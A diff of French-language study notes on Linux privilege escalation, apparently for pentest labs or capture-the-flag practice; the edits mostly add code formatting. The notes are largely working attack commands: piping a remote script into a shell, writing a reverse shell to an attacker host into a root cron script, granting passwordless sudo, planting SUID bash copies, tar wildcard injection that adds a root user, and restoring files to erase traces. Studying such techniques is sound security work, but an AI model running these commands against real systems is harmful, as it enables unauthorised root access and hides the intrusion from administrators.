@@ -16,8 +16,8 @@ Programme d'énumération :
 
 - Pour chopper le plus d'information possible, on va se servir de programme qui vont automatiser l'énumération :
     - LinEnum
-    - Linpeas, on peut l'utiliser en faisant curl -L [https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh") | sh ou sinon tu l'envoie en partage de fichier via ta machine. Pense aussi à faire chmod 755 ./linpeas.sh
-    - linux-exploit-suggester, on peut l'utiliser en faisant wget [https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh](https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh") -O les.sh apres tu fais chmod 755 ./les.sh et enfin ./les.sh
+    - Linpeas, on peut l'utiliser en faisant `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` ou sinon tu l'envoie en partage de fichier via ta machine. Penses aussi à faire `chmod 755 ./linpeas.sh`
+    - linux-exploit-suggester, on peut l'utiliser en faisant `wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh` apres tu fais `chmod 755 ./les.sh` et enfin `./les.sh`
 
 # Jobs/Tasks
 
@@ -43,20 +43,20 @@ Programme d'énumération :
 
 - Y'a un autre truc qui est lié aussi c'est que la cron task va s'exécuter avec le SHELL= ? par exemple `/bin/sh -c "`command in cron job" donc en fait on peut juste mettre un script à la place d'un payload de msfvenom.
     - Par exemple : `echo 'echo "devops ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > /dev/shm/systemctl` // ne jamais oublier de mettre `chmod 755`/dev/shm/systemctl pour qu'il ait les droits d'exec.
-    - Ensuite tu peux check avec sudo -l pour voir si ça marche.
+    - Ensuite tu peux check avec `sudo -l` pour voir si ça marche.
 
 - Si tu n'as pas les permissions pour écrire dans un dossier, ça veut pas forcément dire que tu n'as pas les permissions pour écrire sur les fichiers dans ce dossier.
     - `ls -l /opt | grep "scripts"` // ça pourrait te renvoyer que tu n'as pas les permissions pour écrire
     - `ls -l /opt/scripts | grep "check-health.sh"` // ça pourrait te renvoyer que tu a les permissions pour écrire dedans.
     - Tu peux donc mettre ton payload à l'intérieur comme par exemple : `cp /bin/bash /tmp && chmod +s /tmp/bash` et tu le rajoute au début du script check-health.sh
     - Ensuite tu check le dossier /tmp pour voir si le fichier bash apparait avec le SUID bit : ls -l /tmp
-    - Enfin si ça marche, tu peux donc lancer un shell en mode root (-p) : /tmp/bash -p
+    - Enfin si ça marche, tu peux donc lancer un shell en mode root (-p) : `/tmp/bash -p`
 
 - Si par contre linpeas t'affiche le dossier qui contient la cron task en jaune/rouge, tu as les perm pour écrire dedans.
     - Donc si le fichier n'existe même pas dedans, tu peux le créer et mettre ton reverse shell dedans :
-        - echo '#!/bin/bash' > /opt/scripts/backup.sh
-        - echo "" >> /opt/scripts/backup.sh
-        - echo 'bash -i >& /dev/tcp/ip_attacker/port_attacker 0>&1' >> /opt/scripts/backup.sh
+        - `echo '#!/bin/bash' > /opt/scripts/backup.sh`
+        - `echo "" >> /opt/scripts/backup.sh`
+        - `echo 'bash -i >& /dev/tcp/ip_attacker/port_attacker 0>&1' >> /opt/scripts/backup.sh`
 
 - Si une cron job travaille dans un dossier auquel tu as accès/droit d'écriture, tu peux peut-être faire des Wildcard injection :
     - Imaginons que tu sois l'user www-data et qu'une cron task execute la commande :
@@ -71,10 +71,10 @@ Programme d'énumération :
 
         - où les fichiers sont dans le dossier et notre fichier d'injection et interprété comme un switch. On va donc check si le fichier output.txt est bien créé. Si oui, et bah on peut l'exploiter.
             
-    - Pour l'exploiter, on peut utiliser les switch "--checkpoint" et "--checkpoint-action" qui, quand la cron task va s'executer, le checkpoint va commencer et va donc trigger le checkpoint-action qui sera une commande qu'on voudra.
+    - Pour l'exploiter, on peut utiliser les switch `--checkpoint` et `--checkpoint-action` qui, quand la cron task va s'executer, le checkpoint va commencer et va donc trigger le checkpoint-action qui sera une commande qu'on voudra.
         
         - En premier lieu, on va créer un password qu'on va désigner comme le password de notre futur user rooté :
-            - `openssl passwd "password"` // sur notre machine attaquante
+            - `openssl passwd "password"`  sur notre machine attaquante
         - Ensuite, on retourne sur notre cible et on va créer notre fichier shell (qu'on va nommé rootme.sh) qui sera executé par le checkpoint action :
             - `echo '#!/bin/bash' > /var/www/html/rootme.sh`
             - `echo "" >> /var/www/html/rootme.sh`
@@ -84,24 +84,24 @@ Programme d'énumération :
         - Enfin, on créer nos deux fichiers qu'on va utiliser pour les 2 switch :
             - `touch '/var/www/html/--checkpoint=1'`
             - `touch '/var/www/html/--checkpoint-action=exec=sh rootme.sh'`
-        - Maintenant y'a plus qu'à attendre de voir si l'user est bien placé dans le fichier /etc/passwd. Si oui, on pourra alors se foutre en root.
+        - Maintenant y'a plus qu'à attendre de voir si l'user est bien placé dans le fichier `/etc/passwd`. Si oui, on pourra alors se mettre en root.
 
-- Si on a trouvé aucune cron task avec linPEAS, on peut toujours essayé de chercher les cron tasks user qui sont stocké dans /va/spool/cron/crontabs mais innaccessible aux users.
+- Si on a trouvé aucune cron task avec linPEAS, on peut toujours essayé de chercher les cron tasks user qui sont stocké dans /va/spool/cron/crontabs mais inaccessible aux users.
     - On va d'abord check si cron tourne en fond, on aura peut-être une chance de l'exploit :
-        - `ps -efw | grep -i "cron"` // Si tu vois une ligne avec cron lancé, y'a une chance.
+        - `ps -efw | grep -i "cron"`  Si tu vois une ligne avec cron lancé, y'a une chance.
     - Faut maintenant trouver des hidden cron jobs avec PsPy, un script pour lister tous les processus, voir les commandes que les autres users executent et plus encore je crois.
-        - Il faut que la cible ait installé PsPy (qu'on peut faire nous même) puis tu fais `chmod 755 ./pspy64`
-        - `./pspy64 `// Attend un peu pour voir si y'a des tâches qui s'executent toute les minutes par exemple. Par exemple tu pourrais voir une ligne /usr/sbin/cron -f suivie d'une ligne avec la commande. C'est encore mieux si c'est avec le UID=0 (en root)
+        - Il faut que la cible ait installé PsPy (ce qu'on peut faire nous même) puis tu fais `chmod 755 ./pspy64`
+        - `./pspy64 `// Attend un peu pour voir si y'a des tâches qui s'executent toute les minutes par exemple. Par exemple tu pourrais voir une ligne `/usr/sbin/cron -f` suivie d'une ligne avec la commande. C'est encore mieux si c'est avec le UID=0 (en root)
     - Ensuite, suivant la commande executé, tu peux essayer de l'exploiter.
-    - Imaginons qu'on ait la commande /bin/bash -c /opt/scripts/test-connect.sh, on va donc check si on a les permissions dans le dossier et sur le fichier
-        - On va donc essayer de remplacer ce fichier avec le notre : on va le bouger vers un dossier où on pourra le modifier. /dev/shm par exemple :
-            - `mv /opt/srcipts/test-connect.sh /dev/shm` // si quand on fait ls -l /dev/shm, on voit qu'on devient le propriétaire du fichier, on pourrai donc directement pouvoir modifier le fichier dans /opt/scripts/ mais je trouve ça bizarre donc part du principe que ça marche pas. Bref du coup dans le fichier on pourrait mettre :
+    - Imaginons qu'on ait la commande `/bin/bash -c /opt/scripts/test-connect.sh`, on va donc check si on a les permissions dans le dossier et sur le fichier
+        - On va donc essayer de remplacer ce fichier avec le notre : on va le bouger vers un dossier où on pourra le modifier. `/dev/shm` par exemple :
+            - `mv /opt/srcipts/test-connect.sh /dev/shm`  si quand on fait `ls -l /dev/shm`, on voit qu'on devient le propriétaire du fichier, on pourrai donc directement pouvoir modifier le fichier dans /opt/scripts/ mais je trouve ça bizarre donc part du principe que ça marche pas. Bref du coup dans le fichier on pourrait mettre :
             - `echo '#!/bin/bash' > /opt/scripts/test-connect.sh`
             - `echo "" >> /opt/scripts/test-connect.sh`
             - `echo 'cp /bin/bash /tmp && chmod +s /tmp/bash' >> test-connect.sh`
             - C'est pour qu'on puisse lancer un shell avec le setuid à partir de /tmp.
-        - Maintenant, on attend que le fichier bash dans /tmp ait le setuid. Quand tu l'as, t'as plus qu'à faire /tmp/bash -p
-        - Pour effacer les traces, dans le shell root que t'as choppé tu peux faire mv /dev/shm/test-connect.sh /opt/scripts/ pour remettre le script de base dans le dossier /opt/scripts puis tu fais chown root:root /opt/scripts/test-connect.sh pour définir le propriétaire sur root. Maintenant, tout est redevenu comme avant et tu as un shell root.
+        - Maintenant, on attend que le fichier bash dans /tmp ait le setuid. Quand tu l'as, t'as plus qu'à faire `/tmp/bash -p`
+        - Pour effacer les traces, dans le shell root que t'as récupéré tu peux faire `mv /dev/shm/test-connect.sh /opt/scripts/` pour remettre le script de base dans le dossier `/opt/scripts` puis tu fais `chown root:root /opt/scripts/test-connect.sh` pour définir le propriétaire sur root. Maintenant, tout est redevenu comme avant et tu as un shell root.
 
 # **Upgrade to full TTY**
 
@@ -112,7 +112,7 @@ Imagine que t'ai un shell pas interactif que t'as eu à travers ftp donc quand t
 - A la place, sur ta cible : `python3 -c 'import pty;pty.spawn("/bin/bash");' `// PTY c'est un module python pour faire spawn un processus shell séparé.
 - Normalement, t'as un processus qui s'est lancé. Maintenant tu fais CTRL + Z pour revenir sur ta machine puis tu fais :
 - `stty raw -echo`
-- Toujours sur ta cible, tu fais "fg" ca devrais afficher "nc -lvpn 443" puis tu fais "export TERM=xterm" pour exporter le shell xterm pour avoir un full TTY
+- Toujours sur ta cible, tu fais `fg` ca devrais afficher `nc -lvpn 443` puis tu fais `export TERM=xterm` pour exporter le shell xterm pour avoir un full TTY
 - Si tu retourne sur ta cible et que tu retente ftp ip_attacker, normalement tu devrais avoir un shell interactif (qui reçoit et envoie des outputs au programme)
 
 # Wildcard injection
@@ -121,12 +121,12 @@ Imagine que t'ai un shell pas interactif que t'as eu à travers ftp donc quand t
 
 - Le kernel c'est ce qui se trouve entre le software et le hardware. Son jobs c'est de convertir les intput/output (I/O) en instruction pouvant faire intéragir hardware et software.
 - Énumération pour du Kernel exploit :
-    - `uname -a` ou `cat /proc/version` // voir la version du kernel
+    - `uname -a` ou `cat /proc/version`  voir la version du kernel
     - [https://en.wikipedia.org/wiki/Linux_kernel_version_history](https://en.wikipedia.org/wiki/Linux_kernel_version_history "https://en.wikipedia.org/wiki/Linux_kernel_version_history") pour voir à partir de quelle date les exploit qu'on va trouver fonctionneront.
-    - `find / -perm -4000 2>/dev/null `// trouver les binary avec le SUID bit
-    - `wget [https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh](https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh") -O les.sh`
-    - `gcc` // Pour check si on peut compiler notre exploit directement sur la machine (le meilleur des cas)
-    - `find / -iname "gcc" 2>/dev/null` // Si tu trouve vraiment rien pour le compiler, tu peux le compiler soit à partir de ta machine, soit à partir d'une vm.
+    - `find / -perm -4000 2>/dev/null ` trouver les binary avec le SUID bit
+    - `wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh`
+    - `gcc`  Pour check si on peut compiler notre exploit directement sur la machine (le meilleur des cas)
+    - `find / -iname "gcc" 2>/dev/null` Si tu trouve vraiment rien pour le compiler, tu peux le compiler soit à partir de ta machine, soit à partir d'une vm.
 
 ## Cool Kernel Exploit :
 
